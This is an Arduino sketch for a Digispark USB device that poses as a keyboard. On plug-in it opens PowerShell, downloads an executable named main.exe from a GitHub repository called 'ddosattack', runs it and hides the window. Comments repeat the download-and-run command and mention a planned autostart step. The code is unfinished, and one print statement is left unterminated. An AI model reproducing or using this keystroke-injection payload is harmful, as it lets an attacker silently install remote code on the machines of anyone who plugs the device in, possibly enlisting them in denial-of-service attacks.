#include <DigiKeyboard.h>

void setup() {
  //line 5-10 launches powershell
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  //line 12-15 downloads the .exe file
  DigiKeyboard.print("Invoke/WebRequest /Uri https>&&raw.githubusercontent.com&Fred/the/bot&ddosattack&master&main.exe /OutFile .");
  DigiKeyboard.sendKeyStroke(0x64,MOD_ALT_RIGHT); // sends a "\"
  DigiKeyboard.print("main.exe<");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //line x-x sets the exe file to launch with windows.
  DigiKeyboard.print("

  //line x-x launches the exe file and closes the powershell window
  DigiKeyboard.print(".");
  DigiKeyboard.sendKeyStroke(0x64,MOD_ALT_RIGHT);
  DigiKeyboard.print("main.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
  DigiKeyboard.delay(10);
  DigiKeyboard.sendKeyStroke(KEY_I);
}

void loop() {

}

//https://www.medo64.com/2021/09/add-application-to-auto-start-from-powershell/
//$PWD.path

// Invoke-WebRequest -Uri https://raw.githubusercontent.com/Fred-the-bot/ddosattack/master/main.exe -OutFile .\main.exe; 
//.\main.exe
